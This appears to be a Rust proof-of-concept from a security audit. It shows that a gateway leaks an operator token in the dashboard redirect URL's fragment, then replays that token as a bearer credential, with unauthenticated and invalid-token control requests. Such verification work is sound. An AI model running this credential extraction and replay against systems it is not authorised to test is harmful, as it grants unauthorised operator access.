// F1 - Dashboard fragment token leak.
//
// Hypothesis: the gateway hands the dashboard a credential inside the URL
// fragment (`#...token=...`), and that same value is accepted as a bearer
// credential on the HTTP API. Anything able to read the launched URL (browser
// history, clipboard, a shared link, a screenshot) therefore obtains operator
// access.
//
// What this program does NOT claim: it does not follow the redirect, does not
// run JavaScript, and does not touch browser history. It reproduces the leak by
// reading the redirect the gateway itself issues, then proves the leaked value
// is a working credential by replaying it.
//
// Build:  rustc F1.rs -o F1
// Run:    ./F1 [--host 127.0.0.1] [--port 18789] [--json]

#![allow(dead_code, unused_imports)]

include!("poc_support.rs");

fn main() {
    let args = Args::parse();
    let mut report = Report::new("F1", "Dashboard fragment token leak");
    if !args.json {
        banner("F1", "Dashboard fragment token leak");
        println!("    target: {}", args.addr());
    }

    // 1. Ask for the dashboard and read the redirect it issues.
    let resp = match get(&args.host, args.port, "/dashboard/") {
        Some(r) => r,
        None => {
            report.note(format!(
                "no HTTP response from {} - is the gateway running there?",
                args.addr()
            ));
            report.finish(args.json, 3);
        }
    };

    let location = resp.header("location").unwrap_or("").to_string();
    if location.is_empty() {
        report.note(format!(
            "status {} with no Location header: the dashboard did not hand out a URL",
            resp.status
        ));
        report.finish(args.json, 1);
    }
    report.evidence(format!("dashboard redirect: {location}"));

    let token = match token_from_fragment(&location) {
        Some(t) => t,
        None => {
            report.note("redirect URL carries no token/access_token in its fragment");
            report.finish(args.json, 1);
        }
    };
    let shown = if token.len() > 6 {
        format!("{}...{} ({} chars)", &token[..3], &token[token.len() - 3..], token.len())
    } else {
        format!("({} chars)", token.len())
    };
    report.evidence(format!("credential leaked in fragment: {shown}"));

    // 2. Control: an unauthenticated read must be refused.
    let anon = get(&args.host, args.port, "/tools/list");
    let anon_status = anon.as_ref().map(|r| r.status).unwrap_or(0);
    report.evidence(format!("baseline unauthenticated /tools/list -> HTTP {anon_status}"));

    // 3. Replay the leaked value as a bearer credential.
    let replay = get_bearer(&args.host, args.port, "/tools/list", &token);
    let replay_status = replay.as_ref().map(|r| r.status).unwrap_or(0);
    report.evidence(format!("replay of leaked value on /tools/list -> HTTP {replay_status}"));

    // 4. A wrong token must fail, otherwise the endpoint ignores auth entirely
    //    and the replay above would not be evidence of anything.
    let bogus = get_bearer(&args.host, args.port, "/tools/list", "definitely-not-the-token");
    let bogus_status = bogus.as_ref().map(|r| r.status).unwrap_or(0);
    report.evidence(format!("control with an invalid token -> HTTP {bogus_status}"));

    if bogus_status == 200 {
        report.note(
            "the control request with an invalid token also succeeded, so this target \
             does not enforce auth and the replay proves nothing",
        );
        report.finish(args.json, 2);
    }

    if replay_status == 200 && anon_status != 200 {
        report.evidence("the leaked fragment value is a working operator credential");
        report.note(
            "any party that can read the launched URL (history, clipboard, shared link) \
             can replay it",
        );
        report.confirmed = true;
        report.finish(args.json, 0);
    }

    report.note(format!(
        "the leaked value was rejected (HTTP {replay_status}); it is not a usable credential \
         on this target, so the leak carries no operator access"
    ));
    report.finish(args.json, 1);
}
